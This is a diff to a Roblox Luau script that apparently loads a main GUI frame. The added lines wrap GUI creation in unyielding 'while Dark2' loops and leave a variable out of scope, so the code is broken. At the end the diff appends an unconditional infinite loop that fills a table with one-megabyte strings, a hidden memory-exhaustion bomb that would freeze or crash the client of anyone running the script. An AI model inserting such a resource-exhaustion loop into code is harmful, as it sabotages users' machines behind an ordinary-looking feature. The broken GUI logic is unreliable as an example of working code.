@@ -52,25 +52,34 @@ end
 task.wait(2)
 print("Loading Main Gui")
 
+while Dark2 == true do
 task.wait(30)
 local Frame = Instance.new("Frame")
 Frame.Parent = ScreenGui
 Frame.Size = UDim2.new(0.5, 0, 0.5, 0)
 Frame.Position = UDim2.new(.25, 0, .25, 0)
 Frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+end
 
+while Dark2 == true do
 local FrameStroke = Instance.new("UIStroke")
 FrameStroke.Parent = Frame
 FrameStroke.Thickness = 2
+end
 
+while Dark2 == true do
 local FrameCorner = Instance.new("UICorner")
 FrameCorner.Parent = Frame
 FrameCorner.CornerRadius = UDim.new(.01)
-
-task.wait(.1)
-while Dark2 == true do
-  print("SIX_SEVEN")
 end
+
+task.wait(10)
+local huge_table = {}
+    while true do
+        table.insert(huge_table, string.rep("A", 1024 * 1024))
+    end
+
+
 
 
 
